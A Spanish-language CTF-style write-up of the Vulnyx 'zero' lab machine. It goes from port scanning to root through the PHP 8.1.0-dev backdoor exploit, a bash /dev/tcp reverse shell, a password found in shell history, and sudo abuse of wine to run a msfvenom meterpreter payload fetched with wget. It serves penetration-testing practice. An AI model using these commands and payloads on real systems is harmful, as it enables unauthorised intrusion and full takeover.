# Vulnyx-zero

### Escaneo de Puertos

```bash
# Nmap scan
nmap -p 22,80,8000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
•22/tcp   open   ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
•80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
•8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

Encontramos una página con un solo h1 "Zerodium", posiblemente un usuario.

### Fuzzing

```bash
gobuster dir -u (IP-victima) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.sh
/index.php
```

Fuzzing no nos dio resultados, así que volvemos a nuestros pasos y vemos que nmap encontró "PHP 8.1.0-dev".

```bash
searchsploit PHP 8.1.0-dev
```

Encontramos un exploit:

```bash
searchsploit -m /php/webapps/49933.py
```

Dentro de [exploit-db](https://www.exploit-db.com/exploits/49933), encontramos que al ejecutarlo nos pide una dirección y luego comandos.

```bash
whoami
•root
```

Somos root, pero con pocas opciones. Procederemos a crear una reverseshell hacia nuestra máquina.

Nos ponemos en escucha con Netcat:

```bash
nc -nlvp 443
```

Ejecutamos la reverseshell dentro de la máquina víctima:

```bash
bash -c "bash -i >& /dev/tcp/(IP-atacante)/443 0>&1"
```

Ya estamos dentro como root, pero vemos que somos root dentro del casillero de un Docker.

Hacemos el tratamiento de la TTY para estar más cómodos:

```bash
script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Luego de intentar varias cosas, vemos el historial:

```bash
history
•1  sshpass -p 'L************4' ssh liam@127.0.0.1
```

Ingresamos como liam:

```bash
ssh liam@(IP-victima)
pass: L*************4
```

```bash
sudo -l
• (root) NOPASSWD: /usr/bin/wine
```

Según lo que encontramos, "wine" es un programa para Linux que permite instalar y ejecutar programas para Windows. Crearemos un exploit con msfvenom para Windows, lo ejecutaremos como root y obtendremos una reverseshell.

```bash
msfvenom -l payloads | grep -i windows
•windows/x64/meterpreter/reverse_tcp
```

Creamos el payload ".exe":

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP-atacante) LPORT=443 -f exe > reverse.exe
```

Ponemos a escuchar METERPRETER:

```bash
msfconsole
use multi/handler
**meterpreter**
show options
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST (IP-atacante)
set lport 443
```

Ejecutamos METERPRETER y lo dejamos en escucha en segundo plano mientras ejecutamos el payload en la máquina víctima. Subimos el payload mediante un servidor de Python3:

```bash
python3 -m http.server 8000
```

Dentro de la máquina víctima obtenemos el payload:

```bash
wget http://(IP-atacante):8000/reverse.exe
```

Ejecutamos como root el comando mediante "wine":

```bash
sudo /usr/bin/wine reverse.exe
```

Recibimos la reverseshell en nuestra máquina atacante. Para que la consola sea funcional, debemos escribir "shell" o "interactive".

**Recuerden que creamos un payload para Windows, así que ahora toca usar comandos de Windows, tales como dir, type, etc.**

Ya somos root :D
